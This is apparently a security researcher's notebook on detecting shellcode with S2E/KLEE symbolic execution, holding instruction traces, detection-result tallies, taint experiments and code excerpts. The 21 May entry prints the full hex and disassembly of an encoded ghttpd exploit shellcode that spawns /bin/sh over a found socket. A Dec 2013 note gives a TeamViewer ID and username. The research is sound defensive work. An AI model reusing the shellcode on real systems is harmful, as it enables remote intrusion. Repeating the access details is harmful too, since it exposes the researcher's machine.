>>    401: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    402: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    403: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    404: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    405: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    406: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    407: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    408: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    409: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    410: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    411: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    412: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    413: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    414: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    415: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    416: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    417: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    418: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    419: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    420: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    421: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    422: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    423: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    424: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    425: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    426: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    427: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    428: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    429: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    430: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    431: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    432: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    433: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    434: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    435: 56: 4  6B @0xbfc19cf7: 0f 85 d0 ff ff ff                  jnz dword 0xffffffffffffffd6 nextPC: 0xbfc19cfd


--------- 21 May
Making a iterative shellcode. 
Cut the ghttpd.rawshell into just the shellcode: dd bs=1 skip=464 count=88 if=ghttpd.rawshell of=ghttpd-isolated.rawshell
<< Requesting print out
<< From raw input
Shell start_addr: 0xffb26f80, +512: 0xffb27180, length: 88B, range: 88B, end_addr: 0xffb26fd7
           0 1 2 3  4 5 6 7  8 9 a b  c d e f   ASCII
0xffb26f80 909029c9 83e9f0d9 eed97424 f45b8173  ..).......t$.[.s
0xffb26f90 1349d4d6 2183ebfc e2f431d2 5289e56a  .I..!.....1.R..j
0xffb26fa0 075b6a10 54555289 e1ff016a 6658cd80  .[j.TUR....jfX..
0xffb26fb0 66817d02 8fff75f1 5b6a0259 b03fcd80  f.}...u.[j.Y.?..
0xffb26fc0 4979f952 682f2f73 68682f62 696e89e3  Iy.Rh//shh/bin..
0xffb26fd0 525389e1 b00bcd80                    RS......   
00000000  90                nop
00000001  90                nop
00000002  29C9              sub ecx,ecx
00000004  83E9F0            sub ecx,byte -0x10
00000007  D9EE              fldz
00000009  D97424F4          fnstenv [esp-0xc]
0000000D  5B                pop ebx
0000000E  81731349D4D621    xor dword [ebx+0x13],0x21d6d449
00000015  83EBFC            sub ebx,byte -0x4
00000018  E2F4              loop 0xe
; it looks like it was encoded, and the above is the decoding loop
0000001A  31D2              xor edx,edx
0000001C  52                push edx
0000001D  89E5              mov ebp,esp
0000001F  6A07              push byte +0x7
00000021  5B                pop ebx
00000022  6A10              push byte +0x10
00000024  54                push esp
00000025  55                push ebp
00000026  52                push edx
00000027  89E1              mov ecx,esp
00000029  FF01              inc dword [ecx]
0000002B  6A66              push byte +0x66
0000002D  58                pop eax
0000002E  CD80              int 0x80
00000030  66817D028FFF      cmp word [ebp+0x2],0xff8f
00000036  75F1              jnz 0x29
00000038  5B                pop ebx
00000039  6A02              push byte +0x2
0000003B  59                pop ecx
0000003C  B03F              mov al,0x3f
0000003E  CD80              int 0x80
00000040  49                dec ecx
00000041  79F9              jns 0x3c
00000043  52                push edx
00000044  682F2F7368        push dword 0x68732f2f
00000049  682F62696E        push dword 0x6e69622f
0000004E  89E3              mov ebx,esp
00000050  52                push edx
00000051  53                push ebx
00000052  89E1              mov ecx,esp
00000054  B00B              mov al,0xb
00000056  CD80              int 0x80




---------------3 June
Why is s2e stopping after 2.1K offsets with 10K buffers?
[s2e@s2e:~/s2e/dasos/s2e-last]$ cat run.stats | sed "s/,.*//" | sort | uniq
(0
(1
(2
('NumStates'
There are only ever two states.
[s2e@s2e:~/s2e/dasos/s2e-last]$ wc -l run.stats 
1819 run.stats
There were 1817 gathering points. (wall time matches that Process ran for 2048 seconds, doing 2019 states)
('NumStates','NumQueries','NumQueryConstructs','NumObjects','TranslationBlocks','TranslationBlocksConcrete','TranslationBlocksKlee','CpuInstructions','CpuInstructionsConcrete','CpuInstructionsKlee','ConcreteModeTime','SymbolicModeTime','UserTime','WallTime','QueryTime','SolverTime','CexCacheTime','ForkTime','ResolveTime','MemoryUsage',)
I checked the code base and there are no pointers. Only variable sized objects are the vectors. Ensure that terminateStateEarly handles these. Otherwise the memory growth is due to the state forking possibly. Or some other s2e component





[s2e@s2e:~/s2e/dasos/SavedOutputs]$ ./r.pl live-noeip.txt
Ranking Termination Reasons from live-noeip.txt
      2 Positive
    340 Unexpected OOB Jump
      6 Runaway Other
      8 Invalid OOB Jump
    539 Invalid First Insn
     99 FP Subset
      3 FP Wrong EAX
     24 FP Irregular EAX
      3 Fatal Signal OS
   1024 Total

First timer: 55
Last timer:  994
Difference:  939
t (secs) / offset, tot: 1.03018108651911 after activated: 1.09052183173589

Failed Constraint,126 12.3287671232877%
Invalid Instruction,542 53.0332681017613%
Other Exec Failure,354 34.6379647749511%

FP Irregular EAX,24
FP Subset,99
FP Wrong EAX,3
Fatal Signal OS,3
Invalid First Insn,539
Invalid OOB Jump,8
Positive,2
Runaway Other,6
Unexpected OOB Jump,340


[s2e@s2e:~/s2e/dasos/SavedOutputs]$ ./r.pl live-noeax.txt
Ranking Termination Reasons from live-noeax.txt
    257 Unexpected OOB Jump
     24 Runaway Other
      6 Invalid OOB Jump
    539 Invalid First Insn
    191 FP Subset
      0 Fatal Signal OS
      7 Positive
   1024 Total

First timer: 57
Last timer:  1161
Difference:  1104
t (secs) / offset, tot: 0.881998277347115 after activated: 0.927536231884058

Failed Constraint,191 18.7807276302852%
Invalid Instruction,539 52.9990167158309%
Other Exec Failure,287 28.220255653884%

FP Subset,191
Fatal Signal OS,0
Invalid First Insn,539
Invalid OOB Jump,6
Positive,7
Runaway Other,24
Unexpected OOB Jump,257



[s2e@s2e:~/s2e/dasos/SavedOutputs]$ ./r.pl null-noeip.txt
Ranking Termination Reasons from null-noeip.txt
     24 Unexpected OOB Jump
      6 Invalid OOB Jump
    981 Invalid First Insn
     11 FP Subset
      0 Fatal Signal OS
      2 Positive
   1024 Total

First timer: 57
Last timer:  1062
Difference:  1005
t (secs) / offset, tot: 0.964218455743879 after activated: 1.01890547263682

Failed Constraint,11 1.07632093933464%
Invalid Instruction,981 95.9882583170254%
Other Exec Failure,30 2.93542074363992%

FP Subset,11
Fatal Signal OS,0
Invalid First Insn,981
Invalid OOB Jump,6
Positive,2
Unexpected OOB Jump,24


[s2e@s2e:~/s2e/dasos/SavedOutputs]$ ./r.pl null-noeax.txt
Ranking Termination Reasons from null-noeax.txt
      2 Runaway Kernel
     20 Unexpected OOB Jump
      1 Runaway Other
      7 Invalid OOB Jump
    981 Invalid First Insn
     11 FP Subset
      0 Fatal Signal OS
      2 Positive
   1024 Total

First timer: 65
Last timer:  1024
Difference:  959
t (secs) / offset, tot: 1 after activated: 1.06777893639208

Failed Constraint,11 1.07632093933464%
Invalid Instruction,981 95.9882583170254%
Other Exec Failure,30 2.93542074363992%

FP Subset,11
Fatal Signal OS,0
Invalid First Insn,981
Invalid OOB Jump,7
Positive,2
Runaway Kernel,2
Runaway Other,1
Unexpected OOB Jump,20


Ranking Termination Reasons from ../null-neither
First timer: 63
Last timer:  1061
Difference:  998
t (secs) / offset, tot: 0.965127238454288 after activated: 1.02605210420842


for f in *; do echo $f && ../r.pl $f | grep "[:|%]" | tail -4; done











https://s2e.epfl.ch/embedded/s2e/Howtos/Debugging.html
It is possible to attach GDB to any running instance of S2E. S2E relies on the QEMU GDB interface, which can be enabled with the -s command line option. This option creates a socket on port number 1234.

$ ./i386-s2e-softmmu/qemu  -s2e-config-file config.lua -s
Once the guest is launched and the program is running, attach GDB to it.

$ gdb /path/to/my/prog
(gdb) target remote localhost:1234
#use gdb as usual (set breakpoints, source directories, single-step, etc.).




  1:  1: 2  5B @0x08b2418c: e8 e1 ff ff ff                     call 0xffffffffffffffe6  nextPC: 0x08b24172
29 [State 1] Testing whether data at 8b2417e is symbolic:29 [State 1]  true
29 [State 1] Testing whether data at 8b241a1 is symbolic:29 [State 1]  false
 >> oTBS pc: 0x08b24172 tb_seq_num: 3
 >> oTIE pc: 0x08b24172:0x02 nextpc: 8b24173 len: 1
  0:  2: 3  1B @0x08b24172: 5e                                 pop esi                  nextPC: 0x08b24173
 >> oTIE pc: 0x08b24173:0x03 nextpc: 8b24175 len: 2
  0:  3: 3  2B @0x08b24173: 89 f7                              mov edi, esi             nextPC: 0x08b24175
 >> oTIE pc: 0x08b24175:0x05 nextpc: 8b24177 len: 2
  0:  4: 3  2B @0x08b24175: 89 f2                              mov edx, esi             nextPC: 0x08b24177
 >> oTIE pc: 0x08b24177:0x07 nextpc: 8b2417c len: 5
  0:  5: 3  5B @0x08b24177: b9 29 00 00 00                     mov ecx, 0x29            nextPC: 0x08b2417c
KLEE: WARNING: silently concretizing (reason: memory access from concrete code) expression (Read w8 0 v1_key_1) to value 0 (:0)
 >> oTIE pc: 0x08b2417c:0x0c nextpc: 8b24181 len: 5
  0:  6: 3  5B @0x08b2417c: bb ff 00 00 00                     mov ebx, 0xff            nextPC: 0x08b24181
 >> oTIE pc: 0x08b24181:0x11 nextpc: 8b24183 len: 2
  0:  7: 3  2B @0x08b24181: 31 c0                              xor eax, eax             nextPC: 0x08b24183
 >> oTIE pc: 0x08b24183:0x13 nextpc: 8b24184 len: 1
  0:  8: 3  1B @0x08b24183: 50                                 push eax                 nextPC: 0x08b24184
 >> oTIE pc: 0x08b24184:0x14 nextpc: 8b24185 len: 1
  0:  9: 3  1B @0x08b24184: ac                                 lodsb                    nextPC: 0x08b24185
 >> oTIE pc: 0x08b24185:0x15 nextpc: 8b24187 len: 2
  0: 10: 3  2B @0x08b24185: 31 d8                              xor eax, ebx             nextPC: 0x08b24187
 >> oTIE pc: 0x08b24187:0x17 nextpc: 8b24188 len: 1
  0: 11: 3  1B @0x08b24187: aa                                 stosb                    nextPC: 0x08b24188
 >> oTBE Target by pc: 0x08b24188 to pc: 0x08b2418a
 >> oTBE Target by pc: 0x08b24188 to pc: 0x08b24184
 >> oTIE pc: 0x08b24188:0x18 nextpc: 8b24184 len: 2
  0: 12: 3  2B @0x08b24188: e2 fa                              loop 0xfffffffffffffffc  nextPC: 0x08b24184
 >> oExc pc: 0x08b24172 exception_idx: 239(0xef)
 >> oPC prev: 3 curr: 0
 >> oPC prev: 0 curr: 3
 >> oEI pc: 0x08b24172
  2:  2: 3  1B @0x08b24172: 5e                                 pop esi                  nextPC: 0x08b24173
29 [State 1] Testing whether data at 8b2417e is symbolic:29 [State 1]  false
29 [State 1] Testing whether data at 8b241a1 is symbolic:29 [State 1]  false






  1:  1: 2  5B @0x0925318c: e8 e1 ff ff ff                     call 0xffffffffffffffe6  nextPC: 0x09253172
28 [State 1] Testing whether data at 925317d is symbolic:28 [State 1]  true
28 [State 1] Testing whether data at 92531a1 is symbolic:28 [State 1]  false
 >> oTBS pc: 0x09253172 tb_seq_num: 3
 >> oTIE pc: 0x09253172:0x02 nextpc: 9253173 len: 1
  0:  2: 3  1B @0x09253172: 5e                                 pop esi                  nextPC: 0x09253173
 >> oTIE pc: 0x09253173:0x03 nextpc: 9253175 len: 2
  0:  3: 3  2B @0x09253173: 89 f7                              mov edi, esi             nextPC: 0x09253175
 >> oTIE pc: 0x09253175:0x05 nextpc: 9253177 len: 2
  0:  4: 3  2B @0x09253175: 89 f2                              mov edx, esi             nextPC: 0x09253177
 >> oTIE pc: 0x09253177:0x07 nextpc: 925317c len: 5
  0:  5: 3  5B @0x09253177: b9 29 00 00 00                     mov ecx, 0x29            nextPC: 0x0925317c
KLEE: WARNING: silently concretizing (reason: memory access from concrete code) expression (Read w8 0 v1_key_1) to value 0 (:0)
 >> oTIE pc: 0x0925317c:0x0c nextpc: 9253181 len: 5
  0:  6: 3  5B @0x0925317c: bb 00 00 00 00                     mov ebx, 0x0             nextPC: 0x09253181
 >> oTIE pc: 0x09253181:0x11 nextpc: 9253183 len: 2
  0:  7: 3  2B @0x09253181: 31 c0                              xor eax, eax             nextPC: 0x09253183
 >> oTIE pc: 0x09253183:0x13 nextpc: 9253184 len: 1
  0:  8: 3  1B @0x09253183: 50                                 push eax                 nextPC: 0x09253184
 >> oTIE pc: 0x09253184:0x14 nextpc: 9253185 len: 1
  0:  9: 3  1B @0x09253184: ac                                 lodsb                    nextPC: 0x09253185
 >> oTIE pc: 0x09253185:0x15 nextpc: 9253187 len: 2
  0: 10: 3  2B @0x09253185: 31 d8                              xor eax, ebx             nextPC: 0x09253187
 >> oTIE pc: 0x09253187:0x17 nextpc: 9253188 len: 1
  0: 11: 3  1B @0x09253187: aa                                 stosb                    nextPC: 0x09253188
 >> oTBE Target by pc: 0x09253188 to pc: 0x0925318a
 >> oTBE Target by pc: 0x09253188 to pc: 0x09253184
 >> oTIE pc: 0x09253188:0x18 nextpc: 9253184 len: 2
  0: 12: 3  2B @0x09253188: e2 fa                              loop 0xfffffffffffffffc  nextPC: 0x09253184
 >> oEI pc: 0x09253172
  2:  2: 3  1B @0x09253172: 5e                                 pop esi                  nextPC: 0x09253173
28 [State 1] Testing whether data at 925317d is symbolic:28 [State 1]  false
28 [State 1] Testing whether data at 92531a1 is symbolic:28 [State 1]  false
 >> oEI pc: 0x09253173








Dec 2013
Establishing a new network at my new house:
Florida (vmware host) is set up to ask for a DHCP, so you'll need to set your router to give the proper IP (eg anything you want). S2E has the /etc/network/interfaces file modified to make eth0 request a DHCP >> EOF;
auto eth0
iface eth0 inet dhcp
EOF
So you'll nee dto set your router to give it the proper IP (eg anything you want). S2E runs "TeamViewer" which is a centralized server managed vnc service. This allows you to access the machine from anywhere without knowing its IP address. Its information is s2e-demo (971229718) and can be quickly accessed with the TeamViewer username of rfarley3 and my password. Once logged into TeamViewer you click on s2e-demo and give it the machine's password which is the lab standard non-priv user password.
I currently set my home laptop to act as a wireless-eth bridge by using the Mac Internet Sharing option (http://osxdaily.com/2012/01/05/enable-internet-sharing-mac-os-x/), which makes my machine a NATd/DHCPd/router on 192.168.2.1/24. Fla is .2 and s2e is .3.


sudo vi /etc/resolv.conf nameserver 8.8.8.8
sudo vi /etc/network/interfaces iface eth0 inet dhcp\n   dns-nameservers 8.8.8.8
The other google dns server is 8.8.4.4
The above is not persistent, the below is, across all network changes:
sudo vi /etc/dhcp3/dhclient.conf
prepend domain-name-servers 8.8.8.8, 8.8.4.4;




http://ccadar.github.io/klee/KQuery.html#Concat_expr
KQueryLanguage




11 Feb 2014
; whatever B to hold original value to be good for exec
; still symbolic so taint is propogated

; do XOR on one of the bytes a = X XOR Y, A XOR Y
; x = buf[3]
; buf[3] = x xor y
; mark y symb
; buf[3] = buf[3] xor y
; now buf[3] should be original value, but marked as symb <- 1st req
; now try to exec buf (so buf[3] is forced to be concretized) <- 2nd req


; also need to trace taint propogation
; buf[4] =^ buf[3]
; buf[4] =^ buf[3]
; now buf[4] is original value, but marked as symbolic (bc of buf[3] bc of y)

; now need to trace multiple taint propogations
; mark buf[5] as symbolic
; buf[6] =^ buf[5]



1 Mar 2014
Using symbolic propagation as a taint.
I made a mark symbolic wrapper that duplicates the s2e make symbolic: detected? Y propagrated? Y executable? N taint_survive_simplify? Y
void DasosPreproc::markSymb -> klee::ref<klee::Expr> symb = state->createSymbolicValue (klee::Expr::Int8, nameStr);
   propagation happens; however, when concretized, its value is 0 (ie original value is forgotten)
   In avalance addition, x (value in memory of 0x01) becomes expr (Read w8 0)
   y (value in memory of 0x02)
   x + y = z becomes: (Extract w8 0 (Add w32 (w32 2) (Concat w32 (w8 0) (Concat w24 (w8 0) (Concat w16 (w8 0) (Read w8 0 v1_x_1) ) ) ) ) )
   Extract 8b from 32b 2 (bc it was loaded into a 32b reg) plus v1_x_1 extended to 32b
   Also, the system did not detect the DMA: Symbolic memory accesses are not yet supported by MemoryChecker

   expression = "(" "Concat" [type] msb-expression lsb-expression ")"
   Concat evaluates to a type bits formed by concatenating lsb-expression to msb-expression.
   expression = "(" "Extract" type offset-number child-expression ")"
   Extract evaluates to type bits from child-expression taken from offset-number, where offset-number is the index of the least-significant bit in child-expression which should be extracted.
   

I made another mark symbolic wrapper that does the following: detected? Y propagrated? Y executable? ?
   klee::ref<klee::Expr> symb_const = klee::ConstantExpr::create ((uint8_t) buf, klee::Expr::Int8);
   klee::ref<klee::Expr> symb_taint = state->createSymbolicValue (klee::Expr::Int8, nameStr);
   klee::ref<klee::Expr> symb = klee::AddExpr::create (symb_const, symb_taint);
   results in (Add w8 (w8 <value in memory>) (Read w8 0 <taint name>) )
   
   28 [State 1] x (0x08362191) 28 [State 1] is concrete, val:  0x01; expr: 1
   28 [State 1] Inserting symbolic byte at 0x8362191 with name 'x' from memory value of 0x01
   28 [State 1] x (0x08362191) 28 [State 1] marked symbolic, expr: (Add w8 (w8 1) (Read w8 0 v1_x_1))
   28 [State 1] z (0x08362193) 28 [State 1] is concrete, val:  0x00; expr: 0
   28 [State 1] y (0x08362192) 28 [State 1] is concrete, val:  0x02; expr: 2

	// this adds a constraint to the state assigning a constant expr (tf value) as equal to our convoluted expr for tainting
	s2e()->getExecutor()->toConstant (*state, symb, "markSymbTagged");
   However, when reading the variable from mem, you get the formula, yet the taint no longer propagates
   S2E seems to be smart enough to use the EqExpr as teh simplified form for futher computations. The allows datatrace to work.
   Further toConstant calls exit early bc expr now Constant not add duplicate Exprs upon repeated calls to toConstant (unless thats bc it exits on if ConstantExpr?)
   

   29 [State 1] x (0x0a065191) 29 [State 1] is symbolic, expr: (Add w8 (w8 1) (Read w8 0 v1_x_1))
   29 [State 1] z (0x0a065193) 29 [State 1] is concrete, val:  0x00; expr: 0
   29 [State 1] y (0x0a065192) 29 [State 1] is concrete, val:  0x02; expr: 2
   29 [State 1] Symbolic memory accesses are not yet supported by MemoryChecker
    >> oEI pc: 0x0a065183
    10: 30: 5  1B @0x0a065183: aa                                 stosb                    nextPC: 0x0a065184
   29 [State 1] x (0x0a065191) 29 [State 1] is symbolic, expr: (Add w8 (w8 1) (Read w8 0 v1_x_1))
   29 [State 1] z (0x0a065193) 29 [State 1] is symbolic, expr: (Extract w8 0 (Add w32 (w32 2)
   0000000000000000000000 (Concat w32 (w8 0)
   0000000000000000000000000000000000 (Concat w24 (w8 0)
   0000000000000000000000000000000000000000000000 (Concat w16 (w8 0)
   0000000000000000000000000000000000000000000000000000000000 (Add w8 (w8 1) (Read w8 0 v1_x_1))))))) 29 [State 1] is symbolic, simplified expr: (Extract w8 0 (Add w32 (w32 2)
   0000000000000000000000 (Concat w32 (w8 0)
   0000000000000000000000000000000000 (Concat w24 (w8 0)
   0000000000000000000000000000000000000000000000 (Concat w16 (w8 0)
   0000000000000000000000000000000000000000000000000000000000 (Add w8 (w8 1) (Read w8 0 v1_x_1))))))) KLEE: WARNING: silently concretizing (reason: test concretize) expression (Extract w8 0 (Add w32 (w32 2)
                          (Concat w32 (w8 0)
                                      (Concat w24 (w8 0)
                                                  (Concat w16 (w8 0)
                                                              (Add w8 (w8 1) (Read w8 0 v1_x_1))))))) to value 3 (:0)
   29 [State 1] toConstant, expr: 3 29 [State 1] constraints.size: 2
   
   
   

   klee::ref<klee::Expr> symb_const = klee::ConstantExpr::create ((uint8_t) buf, klee::Expr::Int8);
   klee::ref<klee::Expr> symb_taint = klee::ConstantExpr::create (0, klee::Expr::Int8);
   klee::ref<klee::Expr> symb = klee::AddExpr::create (symb_const, symb_taint);
   results in (Add w8 (w8 <value in memory>) (w8 0) )
   

2 March 2014
From forum:
   In concolic mode, each symbolic variable has a concrete value assigned to it, it is stored in ExecutionState::concolics. 
   You can use the methods of the klee::Assignment class to get these values.
   pair<ref<Expr>, ref<Expr> > range = s2e()->getExecutor()->getSolver()->getRange(Query(state->constraints, parameter));
   s2e_get_example() (from guest/include/s2e.h) is called. This calls concretize() in s2e/Plugins/BaseInstructions.cpp, which in turn calls readMemoryConcrete8 in s2e/S2EExecutionState.cpp, which calls toConstantSilent in klee/lib/Core/Executor.cpp, which calls the solver to get an example concrete value.
ref<klee::ConstantExpr> Executor::toConstantSilent(ExecutionState &state, ref<Expr> e) {
  e = simplifyExpr(state, e);
  e = state.constraints.simplifyExpr(e);
  if (ConstantExpr *CE = dyn_cast<ConstantExpr>(e))
    return CE;
  ref<ConstantExpr> value;
  bool success = solver->getValue(state, e, value);
  assert(success && "FIXME: Unhandled solver failure");
  (void) success;
  addConstraint(state, EqExpr::create(e, value));
  
  
    
Examining executing symbolic code: "silently concretizing (reason: memory access from concrete code) ..."
This output comes from /home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutionState.cpp::void S2EExecutionState::readRamConcrete(uint64_t hostAddress, uint8_t* buf, uint64_t size)
    'memory access from concrete code'
  if symb is found, then this function outputs this error, which is what happens when I execute symbolic code.
  could I put in a hook here? to alert my plugin that memory just got concretized?
  
 
3 March 2014
I made a BasicTaint that mimics a bad objcpy that uses a sizeof/strlen on the untrusted input. It uses a countdown loop (ecx = 8 = strlen (untrusted_obj); loop) vs the old one that mimics a bad strcpy looking for a null terminator (via cmp 0, al; jne). The old one forked 255 states for every cmp. The new one forks only on the overwritten ret. Here is an example state it creates:

Notice how the lower 4 bytes are correct. So why is this trying to make it a 64b address? It's only a 32b guest system.


31 [State 1] forkAndConcretize((ZExt w64 (Concat w32 (Add w8 (w8 8) (Read w8 0 v8_buf0007_8))
000000000000000000000 (Concat w24 (Add w8 (w8 15) (Read w8 0 v7_buf0006_7))
000000000000000000000000000000000 (Concat w16 (Add w8 (w8 177) (Read w8 0 v6_buf0005_6))
000000000000000000000000000000000000000000000 (Add w8 (w8 122) (Read w8 0 v5_buf0004_5)))))))
32 [State 1] Dropping states with constraint 
(Ule (ZExt w64 (Concat w32 (Add w8 (w8 8) (Read w8 0 v8_buf0007_8))
                           (Concat w24 (Add w8 (w8 15) (Read w8 0 v7_buf0006_7))
                                       (Concat w16 (Add w8 (w8 177) (Read w8 0 v6_buf0005_6))
                                                   (Add w8 (w8 122) (Read w8 0 v5_buf0004_5))))))
     (w64 256))
 becase max-forks-on-concretize limit was reached.
35 [State 1] Forking state 1 at pc = 0x80fb1d6 [d6 is the ret insns] into states:
    state 1 with condition (Eq (w32 0)
000 (Concat w32 (Add w8 (w8 8) (Read w8 0 v8_buf0007_8))
000000000000000 (Concat w24 (Add w8 (w8 15) (Read w8 0 v7_buf0006_7))
000000000000000000000000000 (Concat w16 (Add w8 (w8 177) (Read w8 0 v6_buf0005_6))
000000000000000000000000000000000000000 (Add w8 (w8 122) (Read w8 0 v5_buf0004_5))))))
...
    state 256 with condition (Eq (w32 255)
000 (Concat w32 (Add w8 (w8 8) (Read w8 0 v8_buf_8))
000000000000000 (Concat w24 (Add w8 (w8 83) (Read w8 0 v7_buf_7))
000000000000000000000000000 (Concat w16 (Add w8 (w8 97) (Read w8 0 v6_buf_6))
000000000000000000000000000000000000000 (Add w8 (w8 122) (Read w8 0 v5_buf_5))))))

Stack frame at fork:
s2e_dummyMainFunction
tcg-llvm-tb-6-80fb1d3
Size=256 Low=0 splitIndex=128 high=255
 >> oEB pc: 0x080fb1d6
 >> oEI pc: 0x080fb1d6
 43: 31: 9  1B @0x080fb1d6: c3                                 ret                      nextPC: 0x080fb1cf
36 [State 1] buf (0x080fb184) 36 [State 1] is symbolic, expr: (Add w8 (w8 85) (Read w8 0 v1_buf0000_1))

37 [State 245] buf (0x080fb184) 37 [State 245] is symbolic, expr: (Add w8 (w8 85) (Read w8 0 v1_buf0000_1))
 >> oPC prev: 3 curr: 0
 >> oPC prev: 0 curr: 0
 >> oPC prev: 0 curr: 0
 >> oPC prev: 0 curr: 0
 >> oPC prev: 0 curr: 3
 >> oPF addr: 0x000000f4 iswrite: 1
 
 All states fail with the EIP messed up. Its value is the state num (the oPF addr).
 Also note that it max'ed out and didn't do any (Ule (ZExt w64 retaddr) (w64 256) ), why 64b?!
 


 Comparisons
 Eq, Ne, Ult, Ule, Ugt, Uge, Slt, Sle, Sgt, Sge
 Syntax: s.t. U = unsigned, S = signed, lt = less than, le = less than or equal, g = greater
 comparison-expr-kind = ( "Eq" | "Ne" | "Ult" | "Ule" | "Ugt" | "Uge" | "Slt" | "Sle" | "Sgt" | "Sge" )
 expression = "(" comparison-expr-kind [ type ] expression expression ")"
 Comparison operations are always binary and the types of the left- and right-hand side expression must match. If the type is specified, it must be w1.
 

 [s2e@s2e:~/s2e/dasos/SymbolicTaintTesting]$ cat ../s2e-last/debug.txt | grep "oDMA " | grep "seq_num: 11" # fetch legit_retaddr
  >> oDMA ESP/push Write by seq_num: 11 pc: 0x80fb194:0x24 to addr: 0xbff60138 len: 4B value:  0x99  0xb1  0x0f  0x08
 [s2e@s2e:~/s2e/dasos/SymbolicTaintTesting]$ cat ../s2e-last/debug.txt | grep "oDMA W"  # fetch evil_retaddr or | grep "oDMA " | grep "seq_num: 6"
  >> oDMA Write by seq_num: 6 pc: 0x80fb1bc:0x4c to addr: 0x80fb188 len: 4B value:  0x7a  0xb1  0x0f  0x08 
 [s2e@s2e:~/s2e/dasos/SymbolicTaintTesting]$ cat ../s2e-last/debug.txt | grep "left b" | sed -e 's/.*@//' | sed -e 's/,.*//' | uniq  # fetch actual retaddr
 0x08049ace --> 0xce 0x9a 0x04 0x08
 
 [s2e@s2e:~/s2e/dasos]$ ./searchSource.sh forkAndConcretize
 /home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutor.cpp:477:    g_s2e->getDebugStream(s2eState) << "forkAndConcretize(" << expr << ")" << std::endl;
  
  
 From Wang: Catch silent concrete, store symb value, let it be concretized, observe all writes, restore symb value, taint all writes
 
 
 
 For vi highlighting while paging through files:
 /usr/share/vim/vim72/macros/less.sh
 
 
 
 
 
 void ObjectState::write(ref<Expr> offset, ref<Expr> value) {
   // Truncate offset to 32-bits.
   offset = ZExtExpr::create(offset, Expr::Int32);  // RJF it always makes w32 extended expressions
  
   // Check for writes at constant offsets.
   if (ConstantExpr *CE = dyn_cast<ConstantExpr>(offset)) {  // RJF this only works 
     write(CE->getZExtValue(32), value);
     return;
   } 
    
   // Treat bool specially, it is the only non-byte sized write we allow.
   Expr::Width w = value->getWidth();
   if (w == Expr::Bool) {
     write8(offset, ZExtExpr::create(value, Expr::Int8));
     return;
   }

   // Otherwise, follow the slow general case.
   unsigned NumBytes = w / 8;
   assert(w == NumBytes * 8 && "Invalid write size!");
   for (unsigned i = 0; i != NumBytes; ++i) {
     unsigned idx = Context::get().isLittleEndian() ? i : (NumBytes - i - 1);
     write8(AddExpr::create(offset, ConstantExpr::create(idx, Expr::Int32)),
            ExtractExpr::create(value, 8 * i, Expr::Int8));
   }
 }
 



this is the one that S2EExecutionState::writeCpuRegisterRaw calls: 
 void ObjectState::write(unsigned offset, ref<Expr> value) {
   // Check for writes of constant values.
   if (ConstantExpr *CE = dyn_cast<ConstantExpr>(value)) {
     Expr::Width w = CE->getWidth();
     if (w <= 64) {
       uint64_t val = CE->getZExtValue();
       switch (w) {
       default: assert(0 && "Invalid write size!");
       case  Expr::Bool:
       case  Expr::Int8:  write8(offset, val); return;
